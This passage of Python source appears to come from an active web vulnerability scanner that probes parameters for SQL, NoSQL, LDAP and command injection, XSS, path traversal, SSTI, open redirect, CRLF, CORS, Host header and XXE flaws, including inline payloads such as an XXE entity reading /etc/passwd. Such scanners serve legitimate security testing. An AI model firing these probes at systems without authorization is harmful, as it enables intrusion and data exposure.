                    event_bus.publish("finding", {"scan_id": scan.id, **info})

            scan.status = "stopped" if scan.stop_flag else "done"
        except Exception as exc:  # pragma: no cover
            scan.status = "error"
            scan.error = str(exc)
        # Snap the (upper-bound) estimate to the real request count so a
        # finished scan reads as 100% instead of appearing to stop early.
        scan.total = scan.done
        event_bus.publish("scan_done", {"scan_id": scan.id, "status": scan.status, "done": scan.done, "total": scan.total, "found": scan.found})

    # --------------------------------------------------------------------- #
    # Per-injection-point checks
    # --------------------------------------------------------------------- #
    async def _scan_one_point(self, scan, point: InjPoint, categories, send, use_time, d, netloc) -> None:
        base1 = await send(point, point.orig)
        if scan.stop_flag or base1.status == 0:
            return
        base2 = await send(point, point.orig)
        base_min = min(base1.elapsed, base2.elapsed)
        stable = _similar(base1.length, base2.length) and base1.status == base2.status
        base_err = bool(_first(SQL_ERROR_RES, base1.text))

        if "sqli" in categories:
            await self._check_sqli(scan, point, send, base1, base_min, stable, base_err, use_time, d, netloc)
        if "nosql" in categories and not scan.stop_flag:
            await self._check_nosql(scan, point, send, base1, stable, netloc)
        if "ldap" in categories and not scan.stop_flag:
            await self._check_ldap(scan, point, send, base1, stable, netloc)
        if "cmdi" in categories and not scan.stop_flag:
            await self._check_cmdi(scan, point, send, base1, base_min, use_time, d, netloc)
        if "xss" in categories and not scan.stop_flag:
            await self._check_xss(scan, point, send, netloc)
        if "traversal" in categories and not scan.stop_flag:
            await self._check_traversal(scan, point, send, base1, netloc)
        if "ssti" in categories and not scan.stop_flag:
            await self._check_ssti(scan, point, send, netloc)
        if "openredirect" in categories and not scan.stop_flag:
            await self._check_openredirect(scan, point, send, netloc)
        if "crlf" in categories and not scan.stop_flag:
            await self._check_crlf(scan, point, send, netloc)

    async def _check_sqli(self, scan, point, send, base1, base_min, stable, base_err, use_time, d, netloc) -> None:
        # 1) explicit DB error
        for suf in SQLI_ERROR_SUFFIXES:
            if scan.stop_flag:
                return
            r = await send(point, point.orig + suf)
            m = _first(SQL_ERROR_RES, r.text)
            if m and not base_err:
                self._record(scan, "sqli", point, "high", "firm",
                             f"SQL エラー: {m.group(0)[:160]}", netloc,
                             f"ペイロード {point.orig + suf!r} で DB エラーが誘発されました。")
                return
        # 2) quote-balancing behavior (no verbose error required)
        if stable and not base_err:
            rq = await send(point, point.orig + "'")
            rqq = await send(point, point.orig + "''")
            if rq.status != 0 and rqq.status != 0:
                broke = (rq.status != base1.status) or (not _similar(rq.length, base1.length))
                restored = (rqq.status == base1.status) and _similar(rqq.length, base1.length)
                if broke and restored and not _similar(rq.length, rqq.length):
                    self._record(scan, "sqli", point, "high", "firm",
                                 f"引用符バランス差分: base={base1.length}B, '={rq.length}B, ''={rqq.length}B", netloc,
                                 "単一引用符で応答が変化し、二重引用符で基準へ復帰。構文に引用符が混入しており SQLi の可能性。")
                    return
        # 3) boolean-based
        if stable:
            for tsuf, fsuf in SQLI_BOOL_PAIRS:
                if scan.stop_flag:
                    return
                rt = await send(point, point.orig + tsuf)
                rf = await send(point, point.orig + fsuf)
                if rt.status == 0 or rf.status == 0:
                    continue
                true_like_base = rt.status == base1.status and _similar(rt.length, base1.length)
                false_differs = not _similar(rt.length, rf.length) or rt.status != rf.status
                if true_like_base and false_differs:
                    self._record(scan, "sqli", point, "high", "firm",
                                 f"真偽差分: TRUE={rt.length}B/{rt.status}, FALSE={rf.length}B/{rf.status}", netloc,
                                 f"'{tsuf}'(真)は基準応答と一致、'{fsuf}'(偽)は差異。ブラインド SQLi の可能性。")
                    return
        # 4) time-based (blind), confirmed twice
        if use_time:
            rnd = random.randint(1, 9)
            big = 20_000_000
            for tmpl in SQLI_TIME_TEMPLATES:
                if scan.stop_flag:
                    return
                payload = point.orig + tmpl.format(d=d, rnd=rnd, big=big)
                r = await send(point, payload)
                if r.status != 0 and r.elapsed >= base_min + d * 0.6:
                    rc = await send(point, payload)
                    if rc.status != 0 and rc.elapsed >= base_min + d * 0.6:
                        self._record(scan, "sqli", point, "high", "firm",
                                     f"時間差: 基準 {base_min:.1f}s → 注入 {r.elapsed:.1f}/{rc.elapsed:.1f}s (SLEEP {d}s)", netloc,
                                     f"ペイロード {payload!r} で {d}s の遅延を2回とも確認。ブラインド SQLi の可能性。")
                        return

    async def _check_nosql(self, scan, point, send, base1, stable, netloc) -> None:
        # error-based
        for pl in ["'\"`{\r\n", "'||'1'=='1", "[$ne]", '{"$gt":""}']:
            if scan.stop_flag:
                return
            r = await send(point, point.orig + pl if not pl.startswith("{") else pl)
            m = NOSQL_ERROR_RE.search(r.text)
            if m:
                self._record(scan, "nosql", point, "high", "firm",
                             f"NoSQL エラー: {m.group(0)[:120]}", netloc,
                             f"ペイロード {pl!r} で NoSQL/JS エラーらしき出力を検出。")
                return
        # boolean auth-bypass style differential
        if stable:
            rt = await send(point, point.orig + "' || '1'=='1")
            rf = await send(point, point.orig + "' && '1'=='2")
            if rt.status != 0 and rf.status != 0:
                if (rt.status == base1.status and _similar(rt.length, base1.length)
                        and (not _similar(rt.length, rf.length) or rt.status != rf.status)):
                    self._record(scan, "nosql", point, "medium", "tentative",
                                 f"真偽差分: TRUE={rt.length}B, FALSE={rf.length}B", netloc,
                                 "JavaScript 的な真偽式で応答が変化。NoSQL インジェクションの可能性。")

    async def _check_ldap(self, scan, point, send, base1, stable, netloc) -> None:
        for pl in ["*", "*)(cn=*", "*))%00", "*()|&'", ")(|(uid=*"]:
            if scan.stop_flag:
                return
            r = await send(point, pl)
            m = LDAP_ERROR_RE.search(r.text)
            if m:
                self._record(scan, "ldap", point, "high", "firm",
                             f"LDAP エラー: {m.group(0)[:120]}", netloc,
                             f"ペイロード {pl!r} で LDAP エラーらしき出力を検出。")
                return
        # wildcard returns substantially more content than a nonexistent value
        if stable:
            rstar = await send(point, "*")
            rno = await send(point, "zzz" + _rand_marker())
            if rstar.status != 0 and rno.status != 0 and rstar.status == base1.status:
                if rstar.length > rno.length and not _similar(rstar.length, rno.length, ratio=0.15):
                    self._record(scan, "ldap", point, "low", "tentative",
                                 f"ワイルドカード差分: *={rstar.length}B, 無効値={rno.length}B", netloc,
                                 "'*' で応答量が増加。LDAP ワイルドカードが評価されている可能性。")

    async def _check_cmdi(self, scan, point, send, base1, base_min, use_time, d, netloc) -> None:
        base_has_output = bool(CMD_OUTPUT_RE.search(base1.text))
        for suf in CMD_OUTPUT_SUFFIXES:
            if scan.stop_flag:
                return
            r = await send(point, point.orig + suf)
            m = CMD_OUTPUT_RE.search(r.text)
            if m and not base_has_output:
                self._record(scan, "cmdi", point, "high", "firm",
                             f"コマンド出力: {m.group(0)[:120]}", netloc,
                             f"ペイロード {point.orig + suf!r} でコマンド実行結果らしき出力を検出(基準応答には無し)。")
                return
        if use_time:
            for tmpl in CMD_TIME_TEMPLATES:
                if scan.stop_flag:
                    return
                payload = point.orig + tmpl.format(d=d, n=d + 1)
                r = await send(point, payload)
                if r.status != 0 and r.elapsed >= base_min + d * 0.6:
                    rc = await send(point, payload)
                    if rc.status != 0 and rc.elapsed >= base_min + d * 0.6:
                        self._record(scan, "cmdi", point, "high", "firm",
                                     f"時間差: 基準 {base_min:.1f}s → 注入 {r.elapsed:.1f}/{rc.elapsed:.1f}s", netloc,
                                     f"ペイロード {payload!r} で {d}s の遅延を2回とも確認。ブラインド OS コマンド注入の可能性。")
                        return

    async def _check_xss(self, scan, point, send, netloc) -> None:
        m = _rand_marker()
        rp = await send(point, m)
        if m not in rp.text:
            return  # not reflected in this parameter
        # Which special characters survive un-encoded in the reflection context?
        left, right = _rand_marker(), _rand_marker()
        specials = "<>\"'`"
        probe = f"{left}{specials}{right}"
        r = await send(point, probe)
        survived, between, pre = _surviving_specials(r.text, left, right, specials)
        in_script, in_tag = _reflection_context(pre)

        # HTML text context: angle brackets survive → can inject a tag.
        if "<" in survived and ">" in survived and not in_tag:
            tagp = f"{m}<{m}x>"
            rt = await send(point, tagp)
            conf = "firm" if f"<{m}x>" in rt.text else "tentative"
            self._record(scan, "xss", point, "high", conf,
                         f"山括弧が未エンコードで反射 (context=html): 残存={_s(survived)}", netloc,
                         "入力がタグ記号ごと未エンコードで本文に反射。任意タグ挿入=反射型 XSS の可能性。")
            return
        # Inside a <script> block: quote/backtick breakout.
        if in_script and ("'" in survived or '"' in survived or "`" in survived):
            self._record(scan, "xss", point, "high", "firm",
                         f"script 内で引用符が未エンコード反射: 残存={_s(survived)}", netloc,
                         "反射が <script> 内にあり、引用符が未エンコード。JS 文字列を脱出でき反射型 XSS の可能性。")
            return
        # Inside a tag attribute: quote breakout → new attribute/handler.
        if in_tag and ('"' in survived or "'" in survived):
            self._record(scan, "xss", point, "high", "firm",
                         f"属性文脈で引用符が未エンコード反射: 残存={_s(survived)}", netloc,
                         "タグ属性内で引用符が未エンコード。属性を脱出し onerror 等を注入でき反射型 XSS の可能性。")
            return
        # Angle brackets survive but context looked like a tag — still notable.
        if "<" in survived and ">" in survived:
            self._record(scan, "xss", point, "medium", "tentative",
                         f"山括弧が未エンコードで反射: 残存={_s(survived)}", netloc,
                         "山括弧が未エンコードで反射。文脈次第で反射型 XSS の可能性。")
            return
        # Reflected but encoded → not directly exploitable, but worth knowing.
        self._record(scan, "reflection", point, "info", "tentative",
                     f"入力が反射(特殊文字はエンコード; 残存={_s(survived) or 'なし'})", netloc,
                     "入力値が応答に反射していますが、< > \" ' はエンコードされています。DOM/格納型や別文脈での XSS 余地を手動確認する価値があります。")

    async def _check_traversal(self, scan, point, send, base1, netloc) -> None:
        # Control probe: a benign, NON-traversal filename. Many apps return a
        # generic error/debug page for ANY odd value (e.g. a numeric ".x/.y"
        # image-button coordinate), and that page may itself carry a signature
        # (an env dump in a stack trace, etc.). If the signature shows up for
        # the control too, it is NOT traversal-specific — skip it.
        control = await send(point, "zz" + _rand_marker() + ".bin")
        for pl, sig in TRAVERSAL_PROBES:
            if scan.stop_flag:
                return
            # Signature must be injection-specific: absent from BOTH the baseline
            # (original value) AND the benign control response.
            if sig.search(base1.text) or (control.status != 0 and sig.search(control.text)):
                continue
            r = await send(point, pl)
            if r.status == 0 or not sig.search(r.text):
                continue
            rc = await send(point, pl)  # confirm the read is reproducible
            m = sig.search(rc.text)
            if not m:
                continue
            # /etc/passwd and win.ini are high-confidence file reads; a lone
            # environ match is weaker (often an error-page leak) → tentative.
            strong = sig is not ENVIRON_RE
            sev, conf = ("high", "firm") if strong else ("medium", "tentative")
            kind_note = ("" if strong else
                         " ※ environ 署名のみ。エラーページでの環境変数漏えいの可能性もあるため要手動確認。")
            self._record(scan, "traversal", point, sev, conf,
                         f"ファイル内容らしき応答: {m.group(0)[:80]}", netloc,
                         f"ペイロード {pl!r} でファイル内容らしき内容を2回確認(基準・対照応答には無し)。{kind_note}")
            return

    async def _check_ssti(self, scan, point, send, netloc) -> None:
        n1 = random.randint(100, 999)
        n2 = random.randint(100, 999)
        prod = str(n1 * n2)
        # Multiple engines: Jinja/Twig, JSP/Spring EL/Freemarker, Ruby, ERB,
        # Thymeleaf, Razor, Smarty, Angular, Handlebars-ish.
        payloads = [
            f"{{{{{n1}*{n2}}}}}", f"${{{n1}*{n2}}}", f"#{{{n1}*{n2}}}",
            f"<%= {n1}*{n2} %>", f"{{{n1}*{n2}}}", f"*{{{n1}*{n2}}}",
            f"@({n1}*{n2})", f"${{{{{n1}*{n2}}}}}", f"#set($x={n1}*{n2})$x",
        ]
        for pl in payloads:
            if scan.stop_flag:
                return
            r = await send(point, pl)
            if prod in r.text and pl not in r.text:
                self._record(scan, "ssti", point, "high", "firm",
                             f"式が評価: {pl} → {prod}", netloc,
                             f"ペイロード {pl!r} が {prod}({n1}*{n2}) に評価されました。SSTI の可能性。")
                return

    async def _check_openredirect(self, scan, point, send, netloc) -> None:
        mk = _rand_marker()
        evil = f"evil{mk}.example"
        payloads = [f"https://{evil}/", f"//{evil}/", f"/\\{evil}", f"https:/{evil}",
                    f"http://{evil}", f"https://{evil}%2f..", f"\\/\\/{evil}"]
        for pl in payloads:
            if scan.stop_flag:
                return
            r = await send(point, pl, follow_override=False)
            loc = r.header("location")
            if evil in loc:
                self._record(scan, "openredirect", point, "high", "firm",
                             f"Location: {loc[:120]}", netloc,
                             f"ペイロード {pl!r} で外部ホストへの Location リダイレクトを確認。")
                return
            if r.status == 200 and evil in r.text and re.search(
                    r"(?i)(location\.(href|replace|assign)|http-equiv=[\"']?refresh|window\.location)", r.text):
                self._record(scan, "openredirect", point, "medium", "tentative",
                             f"本文に外部ホストへのリダイレクト: {evil}", netloc,
                             f"ペイロード {pl!r} が meta refresh / JS リダイレクトに反映。オープンリダイレクトの可能性。")
                return

    async def _check_crlf(self, scan, point, send, netloc) -> None:
        mk = _rand_marker()
        hdr = f"x-crlf-{mk}"
        for tmpl in CRLF_TEMPLATES:
            if scan.stop_flag:
                return
            pl = tmpl.format(h=hdr)
            r = await send(point, point.orig + pl, follow_override=False)
            injected = any(k.lower() == hdr or (k.lower() == "set-cookie" and hdr in v.lower())
                           for k, v in r.headers)
            if injected:
                self._record(scan, "crlf", point, "high", "firm",
                             f"注入ヘッダ検出: {hdr}", netloc,
                             f"ペイロードで応答ヘッダに {hdr} を注入。CRLF インジェクション / ヘッダ分割の可能性。")
                return

    # --------------------------------------------------------------------- #
    # Target-level checks (run once per scan)
    # --------------------------------------------------------------------- #
    async def _target_checks(self, scan, ctx, categories, do_send, netloc) -> None:
        base_path, base_body, base_hdrs = base_request(ctx)

        # ---- CORS: does the server reflect an arbitrary Origin? ----
        if "cors" in categories and not scan.stop_flag:
            mk = _rand_marker()
            evil_origin = f"https://evil{mk}.example"
            hdrs = [h for h in base_hdrs if h[0].lower() != "origin"] + [("Origin", evil_origin)]
            r = await do_send(scan.method, base_path, base_body, hdrs)
            acao = r.header("access-control-allow-origin")
            acac = r.header("access-control-allow-credentials").lower()
            if evil_origin in acao:
                if acac == "true":
                    self._record_target(scan, "cors", "high", "firm",
                                        f"ACAO: {acao} / ACAC: true", netloc, base_path,
                                        "任意オリジンを反射し、かつ credentials を許可。クロスオリジンで認証付きデータを読める可能性。")
                else:
                    self._record_target(scan, "cors", "medium", "firm",
                                        f"ACAO reflects: {acao}", netloc, base_path,
                                        "任意オリジンを Access-Control-Allow-Origin に反射。機微データなら情報漏えいの可能性。")

        # ---- Host header injection ----
        if "hostheader" in categories and not scan.stop_flag:
            mk = _rand_marker()
            evil = f"evil{mk}.example"
            # Absolute Host override
            h1 = [h for h in base_hdrs if h[0].lower() != "host"] + [("Host", evil)]
            r1 = await do_send(scan.method, base_path, base_body, h1, follow_override=False)
            if evil in r1.header("location") or evil in r1.text:
                where = "Location" if evil in r1.header("location") else "本文"
                self._record_target(scan, "hostheader", "medium", "firm",
                                    f"Host: {evil} が{where}に反映", netloc, base_path,
                                    "Host ヘッダがリダイレクト先/本文に反映。パスワードリセット汚染やキャッシュ汚染の足がかりになり得ます。")
            # X-Forwarded-Host
            if not scan.stop_flag:
                h2 = list(base_hdrs) + [("X-Forwarded-Host", evil)]
                r2 = await do_send(scan.method, base_path, base_body, h2, follow_override=False)
                if evil in r2.header("location") or evil in r2.text:
                    where = "Location" if evil in r2.header("location") else "本文"
                    self._record_target(scan, "hostheader", "medium", "firm",
                                        f"X-Forwarded-Host: {evil} が{where}に反映", netloc, base_path,
                                        "X-Forwarded-Host が反映。リダイレクト/絶対URL生成に影響し得ます。")

        # ---- XXE (in-band): only when the body is XML ----
        if "xxe" in categories and ctx.get("is_xml") and not scan.stop_flag:
            for target_file, sig in (("file:///etc/passwd", PASSWD_RE),
                                      ("file:///c:/windows/win.ini", WININI_RE)):
                if scan.stop_flag:
                    return
                payload = _build_xxe(ctx["raw_body"], target_file)
                if not payload:
                    break
                hdrs = [h for h in base_hdrs if h[0].lower() != "content-type"] + [("Content-Type", ctx.get("ctype") or "application/xml")]
                r = await do_send(scan.method, base_path, payload, hdrs)
                m = sig.search(r.text)
                if m:
                    self._record_target(scan, "xxe", "high", "firm",
                                        f"ファイル内容らしき応答: {m.group(0)[:80]}", netloc, base_path,
                                        f"外部実体 {target_file} を参照する XML を送信したところ、ファイル内容らしき出力を検出。XXE の可能性。")
                    return

    def _proof_flow(self, scan: ActiveScan) -> int:
        """Flow id of the exchange that proved the current finding. Uses the
        task-local last probe; if history recording was off, persist that one
        exchange now so the user can still open it from the finding."""
        probe = _LAST_PROBE.get()
        if probe is None:
            return 0
        if probe.flow_id:
            return probe.flow_id
        try:
            fid = record_flow(
                source="scanner", method=probe.req_method, scheme=scan.scheme,
                host=scan.host, port=scan.port, path=probe.req_path, url=probe.req_url,
                req_headers=probe.req_headers, req_body=probe.req_body,
                status=probe.status, reason="", resp_headers=probe.headers,
                resp_body=probe.raw_resp, resp_length=probe.length,
                mime=probe.header("content-type"), duration_ms=int(probe.elapsed * 1000),
                in_scope=True,
            )
            probe.flow_id = fid
            return fid
        except Exception:
            return 0

    def _record(self, scan: ActiveScan, cat, point: InjPoint, sev, conf, ev, netloc, detail) -> None:
        url = f"{scan.scheme}://{scan.netloc}{scan.path_only}"
        title = CATEGORY_TITLES[cat]
        full_detail = f"パラメータ '{point.name}'（{point.location}）: {detail}"
        f = _finding("active", sev, conf, title, scan.host, url, scan.method, point.name, ev, full_detail,
                     flow_id=self._proof_flow(scan))
        f["dedupe_key"] = f"active|{title}|{scan.host}|{scan.method}|{point.location}|{point.name}"[:512]
        if persist_finding(f):
            scan.findings.append(f)
            scan.found += 1
            event_bus.publish("finding", {"scan_id": scan.id, **f})

    def _record_target(self, scan: ActiveScan, cat, sev, conf, ev, netloc, path, detail) -> None:
        url = f"{scan.scheme}://{netloc}{path.split('?')[0]}"
        title = CATEGORY_TITLES[cat]
        f = _finding("active", sev, conf, title, scan.host, url, scan.method, "(request)", ev, detail,
                     flow_id=self._proof_flow(scan))
        f["dedupe_key"] = f"active|{title}|{scan.host}|{scan.method}|{path.split('?')[0]}"[:512]
        if persist_finding(f):
            scan.findings.append(f)
            scan.found += 1
            event_bus.publish("finding", {"scan_id": scan.id, **f})


# --------------------------------------------------------------------------- #
# XSS context helpers
# --------------------------------------------------------------------------- #
def _surviving_specials(text: str, left: str, right: str, specials: str):
    """Return (survived_set, between, pre_context) for the left..right probe."""
    i = text.find(left)
    if i == -1:
        return set(), "", ""
    j = text.find(right, i + len(left))
    between = text[i + len(left): j] if j != -1 else text[i + len(left): i + len(left) + 40]
    survived = {ch for ch in specials if ch in between}
    pre = text[max(0, i - 160): i]
    return survived, between, pre


def _reflection_context(pre: str):
    """Guess the reflection context from the text preceding the marker."""
    low = pre.lower()
    last_open_script = low.rfind("<script")
    last_close_script = low.rfind("</script")
    in_script = last_open_script != -1 and last_open_script > last_close_script
    last_lt = pre.rfind("<")
    last_gt = pre.rfind(">")
    in_tag = last_lt > last_gt  # an unclosed '<tag ...' precedes us
    return in_script, in_tag


def _s(chars) -> str:
    return "".join(sorted(chars)) if chars else ""


def _build_xxe(body: str, target_file: str) -> Optional[str]:
    """Insert a DOCTYPE with an external-entity and reference it in the first
    element's text. Detection-only (reads a local file signature back)."""
    entity = f'<!DOCTYPE wsxxe [<!ENTITY xxe SYSTEM "{target_file}">]>'
    m = re.search(r">([^<>]+)<", body)
    if m:
        newbody = body[:m.start(1)] + "&xxe;" + body[m.end(1):]
    else:
        # No leaf text — wrap the whole doc's root content is hard; bail.
        return None
    stripped = newbody.lstrip()
    if stripped.startswith("<?xml"):
        idx = newbody.find("?>")
        if idx != -1:
            idx += 2
            newbody = newbody[:idx] + entity + newbody[idx:]
        else:
            newbody = entity + newbody
    else:
        newbody = entity + newbody
    return newbody


# --------------------------------------------------------------------------- #
# Persistence (shared dedupe)
# --------------------------------------------------------------------------- #
def persist_finding(f: Dict[str, Any]) -> bool:
    """Insert a finding unless its dedupe_key already exists. Returns True if inserted."""
    from sqlalchemy import select
    with SessionLocal() as db:
        exists = db.execute(
            select(Finding.id).where(Finding.dedupe_key == f["dedupe_key"])
        ).first()
        if exists:
            return False
        db.add(Finding(
            kind=f["kind"], severity=f["severity"], confidence=f["confidence"],
            title=f["title"], detail=f["detail"], host=f["host"], url=f["url"],
            method=f["method"], param=f["param"], evidence=f["evidence"],
            dedupe_key=f["dedupe_key"], flow_id=f.get("flow_id", 0),
        ))
        try:
            db.commit()
            return True
        except Exception:
            db.rollback()
            return False


scanner_manager = ScannerManager()
